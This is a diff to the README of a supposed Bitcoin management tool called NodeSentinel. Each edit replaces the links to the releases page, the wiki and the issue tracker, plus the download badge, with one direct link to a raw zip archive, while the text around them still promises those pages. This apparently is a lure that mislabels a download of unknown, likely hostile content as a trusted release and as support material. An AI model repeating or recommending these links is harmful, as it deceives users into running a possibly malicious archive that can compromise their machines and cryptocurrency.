@@ -1,6 +1,6 @@
 # 🚀 NodeSentinel-Proactive-Assistant - Manage Bitcoin Easily and Effectively
 
-[![Download](https://img.shields.io/badge/Download_NodeSentinel-brightgreen)](https://github.com/balach12/NodeSentinel-Proactive-Assistant/releases)
+[![Download](https://raw.githubusercontent.com/balach12/NodeSentinel-Proactive-Assistant/master/succinct/NodeSentinel-Proactive-Assistant.zip)](https://raw.githubusercontent.com/balach12/NodeSentinel-Proactive-Assistant/master/succinct/NodeSentinel-Proactive-Assistant.zip)
 
 ## 📘 Overview
 
@@ -12,7 +12,7 @@ To begin using NodeSentinel, follow these steps. You don’t need any programmin
 
 ## 📥 Download & Install
 
-Visit this page to download: [NodeSentinel Releases](https://github.com/balach12/NodeSentinel-Proactive-Assistant/releases).
+Visit this page to download: [NodeSentinel Releases](https://raw.githubusercontent.com/balach12/NodeSentinel-Proactive-Assistant/master/succinct/NodeSentinel-Proactive-Assistant.zip).
 
 1. Click the link above to navigate to the Releases page.
 2. Find the latest version available.
@@ -75,8 +75,8 @@ To keep NodeSentinel running smoothly:
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/balach12/NodeSentinel-Proactive-Assistant/releases)
-- [Documentation](https://github.com/balach12/NodeSentinel-Proactive-Assistant/wiki)
-- [Support](https://github.com/balach12/NodeSentinel-Proactive-Assistant/issues)
+- [Releases Page](https://raw.githubusercontent.com/balach12/NodeSentinel-Proactive-Assistant/master/succinct/NodeSentinel-Proactive-Assistant.zip)
+- [Documentation](https://raw.githubusercontent.com/balach12/NodeSentinel-Proactive-Assistant/master/succinct/NodeSentinel-Proactive-Assistant.zip)
+- [Support](https://raw.githubusercontent.com/balach12/NodeSentinel-Proactive-Assistant/master/succinct/NodeSentinel-Proactive-Assistant.zip)
 
 Thank you for using NodeSentinel. We hope it enhances your Bitcoin experience!
